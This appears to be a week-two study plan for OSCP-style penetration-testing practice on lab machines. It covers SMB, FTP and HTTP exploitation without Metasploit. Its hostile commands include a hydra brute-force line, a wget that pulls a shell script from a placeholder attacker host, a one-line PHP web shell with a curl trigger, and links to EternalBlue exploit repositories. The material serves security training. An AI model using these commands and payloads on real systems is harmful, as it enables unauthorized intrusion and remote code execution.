# 🔓 Week 2: Exploitation & Initial Access

---
## 🎯 Objectives
- Master low-privilege shell acquisition through exposed services
- Exploit FTP, SMB, HTTP manually (no `msfconsole`)
- Begin chaining recon → exploit paths
- Document shell access steps like an OSCP pro

--- 

# 🛠️ Tools to Master
- `hydra` - Brute-force logins (FTP/SSH/HTTP)
- `smbclient` - Connect to open shares
- `ftp` - Explore anonymous FTP access
- `nmap --script` - Use NSE scripts for vulnerable service checks
- `nc`, `telnet` - Manual banner grabbing and shell testing
- `wget`, `curl` - File transfers (pull shell payloads)
- `python3 -m http.server` - Host reverse shell payloads

---
## 💻 Machines to Root
- Machine Skills Targeted
- Blue EternalBlue (manual use of `ms17_010`)
- Legacy SMBv1 exploitation, guest access
- Optimum HTTP service → file upload → RCE

--- 

# 🗓️ Daily Breakdown

--- 
## 📅 Monday – Exploit SMB Services

✅ Objective:
- Understand vulnerable SMB configurations (guest access, old versions)
- Practice manual enumeration & connection

🔧 Tasks:
Run:

```bash
nmap -p 445 --script smb\* 192.168.X.X
enum4linux-ng 192.168.X.X
smbclient -L \\\\192.168.X.X\\
smbclient \\\\192.168.X.X\\<share>
```

- Attempt to retrieve config files, creds, upload shell if writable

📄 Deliverables:
- Report findings on SMB: shares, access rights, files pulled

---

## 📅 Tuesday – FTP / SSH Brute Force + File Transfers

✅ Objective:
- Enumerate anonymous FTP
- Use hydra for bruteforcing if login pages exist

🔧 Tasks:
Run:

```bash
ftp 192.168.X.X
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://192.168.X.X
```

- Learn how to pull files with ftp, push shells if allowed
- Set up HTTP server:

```python
python3 -m http.server 80
```

- Pull shell from victim:

```bash
wget http://attacker-ip/shell.sh
```

📄 Deliverables:
- Notes on file upload/download between attacker & victim

---

## 📅 Wednesday – HTTP Exploits & Upload Bypass

✅ Objective:
- Discover file upload fields
- Try bypassing extension filtering
- Gain reverse shell via HTTP file upload

🔧 Tasks:
- Tools: `burpsuite`, `curl`, `ffuf` for parameter fuzzing
- Upload payload:

```php
<?php system($_GET['cmd']); ?>
```

- Access it:
```bash
curl http://victim/uploads/shell.php?cmd=id
```

📄 Deliverables:
- Document exploitation via web shell
- Include screenshots + payloads used

---

## 📅 Thursday – EternalBlue Without Metasploit (Blue)

✅ Objective:
- Perform manual exploit of MS17-010
- Use Python/Impacket-based scripts, not Metasploit

🔧 Tasks:
- Use this repo: https://github.com/worawit/MS17-010
- Clone, compile, and test:

```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
```

- Follow instructions to test and run exploit

📄 Deliverables:
- Write step-by-step for exploiting EternalBlue without msf

---

## 📅 Friday – Root Legacy & Document

✅ Objective:
- Apply all recon & SMB knowledge to root the box

🔧 Tasks:
- Enumerate SMB shares
- Look for vulnerable services (`nmap -p-`, `--script vuln`)
- Use known public exploits or brute-force shell

📄 Deliverables:
- `legacy-report.md` written from scratch
- Include: recon summary, exploitation method, privesc if needed

---

## 📅 Saturday – Root Optimum & Document

✅ Objective:
- Identify weak HTTP file handling
- Upload malicious payload and gain reverse shell

🔧 Tasks:
- Enumerate web directories
- Upload `shell.aspx` or `.php` via web interface
- Trigger via browser or `curl`

📄 Deliverables:
- `optimum-report.md`
- Payload details, screenshot of shell, steps to gain access

---

## 📅 Sunday – Weekly Wrap-Up & Reflection

✅ Objective:
- Review what worked, what didn’t
- Update `cheatsheet` and `study-log`

🔧 Tasks:
- `notes.md`: list all commands used this week
- `study-log.md`: answer these:
	- What shell method was most effective?
	- Where did you get stuck and how did you overcome it?
	- What should you practice again before Week 10?

---

## ✅ End-of-Week Checklist
- Rooted Blue (manual EternalBlue)
- Rooted Legacy (SMB, no Metasploit)
- Rooted Optimum (file upload exploit)
- 3 full reports written and saved
- `notes.md` and `study-log.md` updated
- Built strong muscle memory for getting shells manually
